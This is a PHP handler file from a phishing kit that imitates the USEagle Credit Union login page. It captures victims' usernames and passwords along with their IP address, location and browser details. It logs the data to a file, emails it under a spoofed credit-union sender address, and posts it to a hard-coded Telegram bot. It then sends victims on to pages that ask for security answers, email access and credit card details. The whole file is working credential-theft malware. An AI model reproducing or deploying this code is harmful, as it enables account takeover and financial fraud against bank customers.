<?php
ob_start();
session_start();



if(isset($_POST['user'])&&isset($_POST['password'])){
	include 'config.php';
	
	$twitter = "login_SESSION";
	$_SESSION['login_SESSION'] = $twitter;

$hi="#--[ USEagle Credit Union ]--#\r\n";
	
	$hi.="Username		: {$_POST['user']}\r\n";
	$hi.="Password 	: {$_POST['password']}\r\n";
	$hi.="#--[ twitter logins ]---#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#--[ created by BUCK (ICQ: +2349092126538) ]---#\r\n";

		$save=fopen("order/requests.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#USEagle Logins > [".$_POST['user']."] From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
  	$headers="From: UsEagle Credit Union <info@useagle.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
		
	$botToken="1961396555:AAEeT7py0hnNApREe-9NAOfRw6QyrqQuio4";

	$website="https://api.telegram.org/bot".$botToken;
	$chatId= '-580530466';  //** ===>>>NOTE: this chatId MUST be the chat_id of a person, NOT another bot chatId !!!**
	$params=[
      'chat_id'=>$chatId, 
      'text'=>$hi,
	];
	$ch = curl_init($website . '/sendMessage');
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$result = curl_exec($ch);
	curl_close($ch);
		

    $key = substr(sha1(mt_rand()),1,25);
   	if ($show_question=="yes") {
		exit(header("Location: ../../Security_Question?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_email_access=="yes") {
		exit(header("Location: ../../Email_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_contact_information=="yes") {
		exit(header("Location: ../../Contact_information?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../Success?wells_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: index.php")); 
        
	}
}


?>